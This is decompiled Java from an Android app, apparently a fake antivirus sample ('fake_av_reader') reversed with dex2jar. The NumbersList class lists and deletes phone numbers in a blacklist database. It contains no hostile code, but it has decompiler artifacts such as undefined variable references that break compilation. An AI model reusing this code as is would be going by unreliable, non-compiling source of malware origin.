package com.example.androiddefender2;

import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.os.Bundle;
import android.view.ContextMenu;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ImageView;
import android.widget.TableLayout;
import android.widget.TableRow;
import android.widget.TextView;
import com.worker.androiddefender2.SystemFunctions;
import system.AppSingleton;

public class NumbersList extends Activity {
  protected AppSingleton as;
  
  TableRow clicked_tr = null;
  
  public void addRow(int paramInt, final String cell0, String paramString2) {
    TableLayout tableLayout = (TableLayout)findViewById(2131296293);
    TableRow tableRow = (TableRow)((LayoutInflater)getSystemService("layout_inflater")).inflate(2130903060, null);
    tableRow.setTag(Integer.valueOf(paramInt));
    ((TextView)tableRow.getChildAt(0)).setText(cell0);
    ((ImageView)tableRow.findViewById(2131296368)).setOnClickListener(new View.OnClickListener() {
          public void onClick(View param1View) {
            int i = ((Integer)NumbersList.this.clicked_tr.getTag()).intValue();
            String str = "DELETE FROM black_list WHERE id=" + i;
            NumbersList.this.as.mainDB.ExecuteSQLScript(NumbersList.this.as.mainDB.getWritableDatabase(), str);
            NumbersList.this.showList();
            SystemFunctions.getDialog(NumbersList.this.getResources().getString(2131099762), String.format(NumbersList.this.getResources().getString(2131099764), new Object[] { this.val$cell0 }), (Context)NumbersList.this);
          }
        });
    tableRow.setOnLongClickListener(new View.OnLongClickListener() {
          public boolean onLongClick(View param1View) {
            NumbersList.this.clicked_tr = (TableRow)param1View;
            NumbersList.this.openContextMenu(param1View);
            return true;
          }
        });
    registerForContextMenu((View)tableRow);
    tableLayout.addView((View)tableRow);
  }
  
  public void btnBack_Click(View paramView) {
    onBackPressed();
  }
  
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2130903044);
    ((TableLayout)findViewById(2131296293)).setOnCreateContextMenuListener((View.OnCreateContextMenuListener)this);
    this.as = AppSingleton.getInstance();
    this.as.getDB(getApplicationContext());
    showList();
  }
  
  public void onCreateContextMenu(ContextMenu paramContextMenu, View paramView, ContextMenu.ContextMenuInfo paramContextMenuInfo) {
    super.onCreateContextMenu(paramContextMenu, paramView, paramContextMenuInfo);
    AdapterView.AdapterContextMenuInfo adapterContextMenuInfo = (AdapterView.AdapterContextMenuInfo)paramContextMenuInfo;
    paramContextMenu.clearHeader();
    paramContextMenu.clear();
    final TextView tv = (TextView)this.clicked_tr.getChildAt(0);
    paramContextMenu.setHeaderTitle(getResources().getString(2131099761) + ": " + textView.getText());
    paramContextMenu.add(getResources().getString(2131099763)).setOnMenuItemClickListener(new MenuItem.OnMenuItemClickListener() {
          public boolean onMenuItemClick(MenuItem param1MenuItem) {
            int i = ((Integer)NumbersList.this.clicked_tr.getTag()).intValue();
            String str = "DELETE FROM black_list WHERE id=" + i;
            NumbersList.this.as.mainDB.ExecuteSQLScript(NumbersList.this.as.mainDB.getWritableDatabase(), str);
            NumbersList.this.showList();
            SystemFunctions.getDialog(NumbersList.this.getResources().getString(2131099762), String.format(NumbersList.this.getResources().getString(2131099764), new Object[] { this.val$tv.getText() }), (Context)NumbersList.this);
            return true;
          }
        });
    paramContextMenu.add(getResources().getString(2131099761)).setOnMenuItemClickListener(new MenuItem.OnMenuItemClickListener() {
          public boolean onMenuItemClick(MenuItem param1MenuItem) {
            return true;
          }
        });
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu) {
    getMenuInflater().inflate(2131230723, paramMenu);
    return true;
  }
  
  public void showList() {
    ((TableLayout)findViewById(2131296293)).removeAllViews();
    Cursor cursor = this.as.mainDB.getOneScanSettingsRow("SELECT * FROM black_list");
    if (cursor != null) {
      cursor.moveToFirst();
      do {
        addRow(cursor.getInt(cursor.getColumnIndex("id")), cursor.getString(cursor.getColumnIndex("number")), getResources().getString(2131099760));
      } while (cursor.moveToNext());
    } 
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/example/androiddefender2/NumbersList.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */